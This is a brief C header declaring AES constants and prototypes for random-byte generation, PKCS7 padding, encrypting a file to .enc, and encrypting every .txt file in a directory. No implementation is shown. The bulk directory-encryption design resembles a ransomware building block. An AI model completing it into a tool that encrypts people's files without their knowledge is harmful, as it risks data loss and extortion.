#ifndef AES_KEYGEN_H
#define AES_KEYGEN_H

#define AES_KEY_LENGTH 32
#define AES_IV_LENGTH 16
#define AES_BLOCK_SIZE 16

// Function to generate random bytes
void generate_random_bytes(unsigned char *bytes, int len);

// Function to pad the data to make it a multiple of AES_BLOCK_SIZE (PKCS7 padding)
int pad_data(unsigned char *data, int data_len);

// Function to encrypt a file with AES and save as .enc
void encrypt_file(const char *input_file, const unsigned char *key, const unsigned char *iv);

// Function to find and encrypt all .txt files in the directory
void encrypt_txt_files_in_directory(const unsigned char *key, const unsigned char *iv);

#endif  // AES_KEYGEN_H
